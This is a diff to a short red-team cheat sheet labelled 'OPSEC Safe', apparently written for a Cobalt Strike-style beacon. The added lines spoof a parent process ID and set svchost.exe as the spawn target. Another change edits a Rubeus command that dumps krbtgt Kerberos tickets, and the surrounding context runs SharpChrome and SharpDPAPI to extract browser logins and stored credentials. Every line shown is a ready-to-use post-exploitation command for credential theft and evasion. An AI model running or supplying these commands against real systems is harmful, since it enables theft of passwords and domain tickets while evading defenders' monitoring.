@@ -1,5 +1,11 @@
 #### OPSEC Safe
 
+PPID Spoof
+```powershell
+ppid 123
+spawnto x64 C:\Windows\System32\svchost.exe
+```
+
 Browser credentials
 ```powershell
 execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
@@ -19,7 +25,7 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x6c5b5 /service:krbtgt /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x64fa3 /service:krbtgt /nowrap
 ```
 
 ```powershell
